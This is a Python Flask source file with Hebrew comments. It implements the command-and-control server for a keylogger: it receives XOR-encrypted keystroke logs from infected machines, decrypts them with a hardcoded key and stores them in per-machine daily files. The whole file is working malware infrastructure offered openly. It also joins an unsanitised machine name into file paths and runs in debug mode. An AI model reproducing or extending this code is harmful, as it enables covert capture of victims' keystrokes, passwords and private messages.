# -*- coding: utf-8 -*-

from flask import Flask, jsonify, request
import os
import time
import codecs

app = Flask(__name__)

# הגדרת נתיב תיקיית הנתונים
DATA_FOLDER = "data"

# הגדרת המפתח הסודי לפענוח
# הערה: ביישום אמיתי, מפתח זה צריך להיות מאוחסן בצורה מאובטחת יותר.
SECRET_KEY = "avi"


def xor_decrypt(cipher_hex: str, key: str, encoding: str = "utf-8") -> str:
    """
    מפענח טקסט מוצפן בפורמט הקס באמצעות אותו מפתח (string).
    """
    if not key:
        raise ValueError("המפתח לא יכול להיות ריק")

    cipher_bytes = bytes.fromhex(cipher_hex)
    key_bytes = key.encode(encoding)

    plain_bytes = bytes([
        b ^ key_bytes[i % len(key_bytes)]
        for i, b in enumerate(cipher_bytes)
    ])
    # print(plain_bytes.decode(encoding))
    return plain_bytes.decode(encoding)

# def xor_decrypt_bytes(data: bytes, key: str) -> bytes:
#     """פענוח XOR על רצף בייטים"""
#     key_bytes = key.encode("utf-8")
#     decrypted = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
#     return decrypted


@app.route('/')
def home():
    return "KeyLogger Server is Running"


@app.route('/api/save_data', methods=['POST'])
def save_data():
    """
    מקבל נתונים מוצפנים מהקיילוגר, מפענח אותם ושומר בקובץ.
    """
    data = request.get_json()
    print(data)
    # בדיקה שה־payload תקין
    if not data or "machine_name" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine_name"]
    encrypted_hex_data = data["data"]
    print(machine,encrypted_hex_data)
    # --- שלב הפענוח ---
    try:
        log_data = xor_decrypt(encrypted_hex_data, SECRET_KEY)
        print(log_data)
    except Exception as e:
        # טיפול בשגיאת פענוח
        return jsonify({"error": f"Decryption failed: {str(e)}"}), 500

    # יצירת תיקייה למכונה אם היא לא קיימת
    machine_folder = os.path.join(DATA_FOLDER, machine)
    print(machine_folder)

    if not os.path.exists(machine_folder):
        print(111)
        os.makedirs(machine_folder)

    # שימוש בשם קובץ יומי
    date_str = time.strftime("%Y-%m-%d")
    filename = f"log_{date_str}.txt"
    file_path = os.path.join(machine_folder, filename)
    print("file_path",file_path)
    # הוספת חותמת זמן לכל שורה
    timestamp = time.strftime("[%Y-%m-%d %H:%M:%S]")
    line_to_write = f"{timestamp} - {log_data}\n"

    # כתיבה לקובץ
    with open(file_path, "a", encoding="utf-8") as f:
        f.write(line_to_write)

    return jsonify({"status": "success", "file": file_path}), 200



if __name__ == '__main__':
    # יצירת תיקיית הנתונים אם היא לא קיימת בעת הפעלת השרת
    if not os.path.exists(DATA_FOLDER):
        os.makedirs(DATA_FOLDER)
    app.run(debug=True)
